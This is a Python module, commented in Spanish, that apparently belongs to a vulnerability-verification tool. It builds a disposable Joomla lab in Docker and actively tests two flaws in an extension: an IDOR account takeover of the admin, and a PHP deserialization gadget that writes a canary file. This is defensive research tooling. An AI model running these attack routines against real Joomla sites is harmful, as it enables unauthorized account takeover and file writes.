"""Dynamic verifier: el equivalente a wpverify.py/drupalverify.py pero para Joomla. Mismo contrato
y mismo nivel de exigencia (ver wpverify.py para la filosofia completa). Copia estructural
deliberada, no una abstraccion compartida -- ver el docstring de drupalverify.py para el porque.

Primer paso ("poco a poco"): SOLO cubre missing-authorization/idor (account-takeover), el mismo
caso con el que empezaron WordPress y Drupal.

A diferencia de Drupal, la imagen oficial `joomla:*-apache` SI soporta una instalacion
desatendida completa por variables de entorno (JOOMLA_DB_*/JOOMLA_SITE_NAME/JOOMLA_ADMIN_*) --
confirmado en vivo contra un MySQL real en este mismo entorno de desarrollo antes de escribir
este modulo: el propio `entrypoint.sh` de la imagen oficial llama a
`installation/joomla.php install --site-name=... --admin-...` con esas variables, asi que no
hace falta construir ninguna imagen derivada (a diferencia de Drupal, que si necesito anadirle
Drush). Diferencias confirmadas en vivo que importan:

  - Joomla 5 EXIGE MySQL >= 8.0.13 -- con mysql:5.7 (el que usan WordPress/Drupal) el instalador
    aborta con "You need MySQL 8.0.13 or higher". Este modulo usa mysql:8.0.
  - El usuario admin NO tiene un ID fijo (ni 1 como WordPress, ni 1 como el uid de Drupal): en una
    instalacion de prueba real salio id=733. Se lee el ID real por SQL directo tras crearlo
    (ver _Lab.mysql_query), nunca se asume un numero.
  - El login real de frontend es `/index.php?option=com_users&task=user.login` con un campo
    anti-CSRF cuyo NOMBRE (no el valor, que siempre es "1") es un hash de 32 caracteres hex por
    sesion -- se scrapea igual que el nonce de WordPress o el form_build_id de Drupal. La cookie
    `joomla_user_state=logged_in` es la señal de exito, mas limpia que buscar texto en la pagina.
  - El propio CLI oficial de Joomla (cli/joomla.php, ya incluido en la imagen, a diferencia de
    Drupal que necesito anadir Drush) trae `user:add --usergroup=Registered` para crear el
    usuario de bajo privilegio y `extension:install --path=<zip> --no-interaction` para instalar
    una extension -- exactamente la misma llamada que usa el propio entrypoint oficial para
    JOOMLA_EXTENSIONS_PATHS, asi que la confianza en que funciona es alta aunque esta version no
    pudo probarla en vivo contra una extension de terceros real todavia.

Requiere un Docker DAEMON alcanzable (mismo chequeo honesto que los otros dos). No necesita
construir nada ni tener internet en tiempo de ejecucion -- solo pulls de imagenes publicas
(joomla, mysql), igual que WordPress."""
from __future__ import annotations

import io
import os
import re
import secrets
import subprocess
import time
import zipfile
from dataclasses import dataclass
from typing import Callable, List, Optional

from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param,
                       _token, _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS)

_MYSQL_IMAGE = "mysql:8.0"           # Joomla 5 exige >=8.0.13 -- confirmado en vivo, 5.7 no vale
_JOOMLA_IMAGE = "joomla:5-apache"


def _run(cmd: List[str], timeout: float = 60.0, input_text=None,
        input_bytes: Optional[bytes] = None) -> subprocess.CompletedProcess:
    if input_bytes is not None:
        return subprocess.run(cmd, capture_output=True, timeout=timeout, input=input_bytes)
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


class _Lab:
    """Recursos Docker efimeros de una verificacion de Joomla (red + 2 contenedores). Sin volumen
    compartido -- Joomla copia su propio codigo DENTRO del contenedor en el primer arranque
    (confirmado en los logs reales: 'Joomla not found in /var/www/html - copying now...'), y el
    CLI oficial (cli/joomla.php) ya vive ahi, asi que todo va por `docker exec` directo contra el
    contenedor ya vivo, igual que drupalverify.py."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-joomlaverify-{tag}"
        self.mysql = f"binoracle-joomlaverify-{tag}-db"
        self.joomla = f"binoracle-joomlaverify-{tag}-cms"
        self._created: List[tuple] = []

    def sh(self, *args, timeout=60.0, input_text=None, input_bytes=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text,
                   input_bytes=input_bytes)

    def setup_network(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.db_pw = db_pw   # recordada para mysql_query() -- ver su docstring
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=joomla",
               "-e", "MYSQL_USER=joomla", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-ujoomla",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def mysql_query(self, sql: str, timeout: float = 15.0) -> str:
        """Consulta SQL directa (con las credenciales que YO misma fije en start_mysql, guardadas
        en self.db_pw) -- necesaria porque, a diferencia de wp-cli/Drush, el CLI de Joomla no
        tiene un comando de 'leer un solo campo' limpio para parsear (user:list imprime una tabla
        ASCII)."""
        r = self.sh("exec", self.mysql, "mysql", "-ujoomla", f"-p{self.db_pw}", "joomla",
                   "--silent", "--skip-column-names", "-e", sql, timeout=timeout)
        return (r.stdout or "").strip()

    def start_joomla(self, db_pw: str, admin_user: str, admin_pass: str, admin_email: str,
                     admin_name: str) -> Optional[str]:
        """Instalacion desatendida REAL via las variables de entorno oficiales -- ver el docstring
        del modulo. Publica el puerto 80 en un puerto aleatorio de 0.0.0.0 (mismo razonamiento de
        Docker-fuera-de-Docker que el resto de laboratorios, ver _lab_host())."""
        self.sh("run", "-d", "--name", self.joomla, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"JOOMLA_DB_HOST={self.mysql}", "-e", "JOOMLA_DB_USER=joomla",
               "-e", f"JOOMLA_DB_PASSWORD={db_pw}", "-e", "JOOMLA_DB_NAME=joomla",
               "-e", "JOOMLA_SITE_NAME=binoracle-lab", "-e", f"JOOMLA_ADMIN_EMAIL={admin_email}",
               "-e", f"JOOMLA_ADMIN_USERNAME={admin_user}", "-e", f"JOOMLA_ADMIN_USER={admin_name}",
               "-e", f"JOOMLA_ADMIN_PASSWORD={admin_pass}",
               "-p", "0.0.0.0::80", _JOOMLA_IMAGE, timeout=90)
        self._created.append(("container", self.joomla))
        r = self.sh("port", self.joomla, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def install_ready(self, tries: int = 100, delay: float = 3.0) -> bool:
        """Espera a que el entrypoint oficial termine SU PROPIA instalacion desatendida (el log
        real dice 'Joomla has been installed' -- se sondea el log en vez de solo el puerto HTTP,
        porque Apache ya responde ANTES de que la instalacion interna termine)."""
        for _ in range(tries):
            r = self.sh("logs", self.joomla, timeout=10)
            out = (r.stdout or "") + (r.stderr or "")
            if "Joomla has been installed" in out:
                return True
            if "ERROR" in out and "Joomla has been installed" not in out:
                # un error real de instalacion no se va a arreglar esperando mas -- pero se sigue
                # esperando igual un poco por si es un warning transitorio de conexion a la BD
                pass
            time.sleep(delay)
        return False

    def http_ready(self, port: str, tries: int = 100, delay: float = 3.0) -> bool:
        import urllib.request
        url = f"http://{_lab_host()}:{port}/"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 60) -> str:
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def joomla_cli(self, *args, timeout: float = 120.0) -> subprocess.CompletedProcess:
        return self.sh("exec", "-w", "/var/www/html", self.joomla, "php", "cli/joomla.php",
                       *args, "--no-interaction", timeout=timeout)

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        r = self.sh("exec", "-i", self.joomla, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def install_extension(self, host_ext_dir: str, slug: str, timeout: float = 90.0) -> bool:
        """Empaqueta la extension (en `host_ext_dir/slug`) como el .zip que Joomla espera subir
        (el manifest XML en la RAIZ del zip, no envuelto en una carpeta extra -- el formato
        distribuible estandar), lo copia al contenedor por `docker exec -i` (sin volumen
        compartido, igual que drupalverify.py) y lo instala con el CLI oficial -- la MISMA
        llamada que usa el propio entrypoint de la imagen para JOOMLA_EXTENSIONS_PATHS."""
        ext_path = os.path.join(host_ext_dir, slug)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(ext_path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, ext_path)
                    zf.write(full, rel)
        remote_zip = f"/tmp/binoracle_ext_{_token()}.zip"
        try:
            r = self.sh("exec", "-i", self.joomla, "sh", "-c", f"cat > {remote_zip}",
                       input_bytes=buf.getvalue(), timeout=timeout)
            if r.returncode != 0:
                return False
        except subprocess.TimeoutExpired:
            return False
        r2 = self.joomla_cli("extension:install", f"--path={remote_zip}", timeout=timeout)
        return r2.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
            except Exception:
                pass


def _joomla_login(base_url: str, user: str, password: str, timeout: float = 15.0):
    """Login real por el formulario de /index.php?option=com_users&view=login (no un shortcut de
    CLI): Joomla exige un campo anti-CSRF cuyo NOMBRE (no valor, siempre '1') es un hash de 32
    caracteres hex unico por sesion -- confirmado en vivo. La cookie 'joomla_user_state=logged_in'
    es la señal de exito (mas limpia que buscar texto en la pagina).

    requests.Session() DIRECTAMENTE, nunca _make_session() -- este login es parte del
    laboratorio efimero, que nunca debe ir por Burp aunque este configurado (ver _lab_host() en
    wpverify.py)."""
    import requests
    s = requests.Session()
    try:
        r0 = s.get(f"{base_url}/index.php?option=com_users&view=login", timeout=timeout,
                  allow_redirects=True)
        m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', r0.text or "")
        token_field = m.group(1) if m else None
        data = {"username": user, "password": password, "option": "com_users",
               "task": "user.login", "return": ""}
        if token_field:
            data[token_field] = "1"
        s.post(f"{base_url}/index.php?option=com_users&task=user.login", data=data,
              timeout=timeout, allow_redirects=True)
    except Exception:
        return None
    return s if s.cookies.get("joomla_user_state") == "logged_in" else None


def _check_prereqs(ext_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable (o sin CLI de docker instalado)"
        res.limitations.append("verificacion dinamica NO intentada: revisa que Docker Desktop/"
                               "dockerd este arrancado y, si binoracle corre dentro de Docker, "
                               "que el socket del host este montado en docker-compose.yml")
        return res
    if not os.path.isdir(os.path.join(ext_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {ext_source_dir}"
        res.limitations.append("el codigo de la extension no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _JoomlaLabSession:
    lab: "_Lab"
    base_url: str
    admin_user: str
    admin_pass: str
    admin_id: str
    sub_user: str
    sub_pass: str
    sub_sess: object
    admin_sess: object


def _bootstrap_joomla_lab(lab: "_Lab", ext_source_dir: str, slug: str, step,
                          res: WpVerifyResult, t0: float,
                          budget_s: float) -> Optional[_JoomlaLabSession]:
    """Pasos 1-4 compartidos, analogos a _bootstrap_lab()/_bootstrap_drupal_lab(): Joomla
    instalado (via el entrypoint oficial, desatendido), extension activa, usuario de bajo
    privilegio creado y logueado. Devuelve None si algo falla, con `res` ya relleno."""
    root_pw, db_pw = secrets.token_urlsafe(16), secrets.token_urlsafe(16)
    # JOOMLA_ADMIN_USERNAME debe ser SOLO alfabetico (sin guion bajo ni numeros) -- el propio
    # entrypoint lo valida con una regex [^a-zA-Z] y aborta si no cumple (confirmado en vivo: con
    # guion bajo la instalacion desatendida nunca llega a ejecutarse, solo avisa y se queda
    # a medio arrancar). El subscriber, creado despues via CLI, NO tiene esa restriccion.
    admin_user, admin_pass = "binoracleadmin", secrets.token_urlsafe(12) + "A1!"
    sub_user, sub_pass = "binoracle_sub", secrets.token_urlsafe(12) + "A1!"

    step("levantando laboratorio Joomla+MySQL aislado en Docker (red propia)...")
    lab.setup_network()
    lab.start_mysql(root_pw, db_pw)
    if not lab.mysql_ready(db_pw):
        res.detail = "MySQL no respondio a tiempo"
        res.logs.append("docker logs (mysql):\n" + lab.logs_tail(lab.mysql))
        return None
    step("MySQL listo; arrancando Joomla (instalacion desatendida oficial)...")
    port = lab.start_joomla(db_pw, admin_user, admin_pass, "admin@binoracle-lab.invalid",
                            "Binoracle Admin")
    if not port:
        res.detail = "no se pudo publicar el puerto de Joomla"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    if not lab.install_ready():
        res.detail = "la instalacion desatendida de Joomla no termino a tiempo"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    if not lab.http_ready(port):
        res.detail = "Joomla no respondio a tiempo"
        res.logs.append("docker logs (joomla):\n" + lab.logs_tail(lab.joomla))
        return None
    base_url = f"http://{_lab_host()}:{port}"
    step(f"Joomla listo en {base_url}; leyendo el ID real del admin (no es fijo en Joomla, a "
         f"diferencia de WordPress/Drupal)...")
    admin_id = lab.mysql_query(f"SELECT id FROM joom_users WHERE username='{admin_user}';")
    if not admin_id.isdigit():
        res.detail = f"no se pudo leer el ID real del admin (salida: {admin_id!r})"
        return None
    step(f"admin id={admin_id}")

    step(f"copiando la extension ({slug}) al contenedor y activandola...")
    if not lab.install_extension(ext_source_dir, slug):
        res.detail = "no se pudo instalar la extension en el laboratorio"
        res.limitations.append("si el slug/version descargados no coinciden con el afectado, o "
                               "el .xml de manifiesto no esta donde extension:install lo espera, "
                               "la instalacion puede fallar")
        return None
    # `extension:install` instala pero NO publica -- confirmado en vivo: un plugin recien
    # instalado queda con enabled=0 en #__extensions, y la peticion de ataque devolvia 404 (el
    # evento del plugin nunca se disparaba) hasta publicarlo por SQL directo. Los componentes
    # normalmente quedan activos solos, pero publicar siempre (WHERE element=slug) es inofensivo
    # si ya lo estaba, y necesario cuando es un plugin o un modulo.
    lab.mysql_query(f"UPDATE joom_extensions SET enabled=1 WHERE element='{slug}';")
    step("extension instalada y publicada. Creando el usuario de bajo privilegio...")

    r = lab.joomla_cli("user:add", f"--username={sub_user}", "--name=Binoracle Sub",
                       f"--password={sub_pass}", "--email=sub@binoracle-lab.invalid",
                       "--usergroup=Registered")
    if r.returncode != 0:
        res.detail = f"creacion del usuario de bajo privilegio fallo: {(r.stderr or r.stdout or '')[:300]}"
        return None

    if budget_s - (time.time() - t0) < 30:
        res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
        return None

    step(f"iniciando sesion como '{sub_user}' (bajo privilegio, via el formulario real)...")
    sub_sess = _joomla_login(base_url, sub_user, sub_pass)
    if sub_sess is None:
        res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
        return None
    res.logs.append(f"login subscriber: OK ({sub_user})")

    admin_sess = _joomla_login(base_url, admin_user, admin_pass)

    return _JoomlaLabSession(lab=lab, base_url=base_url, admin_user=admin_user,
                             admin_pass=admin_pass, admin_id=admin_id, sub_user=sub_user,
                             sub_pass=sub_pass, sub_sess=sub_sess, admin_sess=admin_sess)


def verify_joomla_account_takeover(
    ext_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, id_param_hint: str = "", email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Equivalente Joomla de verify_wordpress_account_takeover/verify_drupal_account_takeover: una
    extension donde un usuario autenticado de bajo privilegio puede cambiar el email/password de
    OTRO usuario (el admin real, con su ID real -- leido por SQL, nunca asumido) porque el
    controlador confia en un ID del request en vez de comprobarlo contra la sesion. `verified`
    SOLO pasa a True con un SEGUNDO login independiente o una lectura real de la BD, nunca por un
    200/302."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(ext_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    id_p = id_param_hint or _pick_param(parameters, _ID_HINTS)
    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de account-takeover necesita un parametro de "
                               "email o de password; afina 'parameters' en la hipotesis del LLM "
                               "o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_joomla_lab(lab, ext_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
        if id_p:
            payload[id_p] = boot.admin_id
        new_email = f"takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) + "A1!" if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "admin_id_objetivo": boot.admin_id, "payload_enviado": payload,
            "metodo": m, "endpoint": endpoint,
        })
        step(f"enviando la peticion -- sesion de '{boot.sub_user}' (bajo privilegio) contra "
             f"{m} {endpoint}, apuntando al id={boot.admin_id}...")
        try:
            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)
            res.evidence["status_code_respuesta"] = resp.status_code
        except Exception as e:
            res.detail = f"la peticion fallo: {e}"
            return res

        confirmed = False
        if new_pass:
            step("confirmando: intentando iniciar sesion de nuevo como el admin con la password "
                 "NUEVA (la que esta peticion fijo)...")
            confirm_sess = _joomla_login(boot.base_url, boot.admin_user, new_pass)
            confirmed = confirm_sess is not None
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            step("confirmando: releyendo el registro del usuario por SQL directo...")
            actual_email = lab.mysql_query(
                f"SELECT email FROM joom_users WHERE id={boot.admin_id};")
            confirmed = actual_email == new_email
            res.evidence["email_tras_peticion"] = actual_email
            res.evidence["email_esperado"] = new_email

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"ACCOUNT TAKEOVER confirmado: la sesion de bajo privilegio "
                          f"('{boot.sub_user}') cambio de verdad la cuenta del admin real "
                          f"(id={boot.admin_id}) -- confirmado por un SEGUNDO login/lectura "
                          f"independiente, no por el codigo de la respuesta")
            step("VERIFICADO: account takeover confirmado en Joomla.")
        else:
            res.ok = True
            res.detail = ("se envio la peticion pero el efecto no se confirmo -- el account "
                          "takeover no se confirmo (puede que el endpoint/parametro no sean los "
                          "reales, o que el controlador si compruebe el id contra la sesion)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_joomla_deserialization(
    ext_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Segunda clase de Joomla ("poco a poco"): equivalente a verify_wordpress_deserialization/
    verify_drupal_deserialization. Mismo escaneo estatico del codigo real de la extension
    (find_file_write_gadget, ver deserialize_gadgets.py) seguido de la misma prueba dinamica
    dura."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(ext_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
    from .wpverify import _SERIAL_HINTS
    ext_root = os.path.join(ext_source_dir, slug)
    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
         "__wakeup()/__destruct() que escriba a fichero)...")
    gadget = find_file_write_gadget(ext_root)
    if gadget is None:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo de la "
                      "extension (una clase con __wakeup()/__destruct() que escriba una "
                      "propiedad publica a una ruta publica via file_put_contents())")
        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro "
                               "del propio codigo de la extension (no cadenas de librerias de "
                               "terceros); si la extension no trae una clase asi, no hay nada "
                               "que verificar sin inventarse una cadena que no esta")
        return res
    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
         f"$this->{gadget.content_prop}))")

    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_joomla_lab(lab, ext_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
        m = (http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            time.sleep(1)
            r = lab.sh("exec", lab.joomla, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
            content = (r.stdout or "")
            present = secret in content
            tried.append({"modo": label, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["contenido_fichero"] = content[:500]
                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")

        if serial_param:
            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
            payload[serial_param] = payload_obj
            try_send("parametro de formulario",
                     data=payload if m != "GET" else None,
                     params=payload if m == "GET" else None)
        if not found:
            try_send("cuerpo crudo", data=payload_obj.encode())

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
                          f"exacto en {canary_path}")
        else:
            res.ok = True
            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
                          f"fichero canario apareciera con el secreto -- la deserializacion no "
                          f"se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()
